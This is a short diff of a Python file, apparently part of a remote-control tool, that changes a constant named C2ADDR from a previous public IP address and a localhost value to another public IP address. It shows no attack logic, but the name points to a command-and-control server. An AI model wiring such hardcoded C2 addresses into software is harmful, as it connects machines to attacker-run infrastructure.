@@ -15,8 +15,7 @@ from kpm import kpm
 import avalon_framework as avalon
 import os
 import socket
-C2ADDR = "45.77.173.57"
-C2ADDR = "127.0.0.1"
+C2ADDR = "107.191.39.134"
 
 
 # -------------------------------- Classses
